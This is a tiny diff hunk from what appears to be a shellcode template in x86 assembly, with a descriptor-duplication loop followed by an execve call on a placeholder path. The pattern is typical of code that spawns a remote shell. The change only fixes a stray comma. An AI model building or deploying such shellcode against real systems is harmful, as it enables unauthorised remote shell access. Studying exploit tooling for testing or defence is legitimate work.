@@ -61,7 +61,7 @@ duploop:\n \
 	;execve\n \
 	mov al, 0xb\n \
 	xor ecx, ecx\n \
-	push ecx,\n \
+	push ecx\n \
 	*PATH* \n \
 	mov ebx, esp\n \
 	cdq\n \
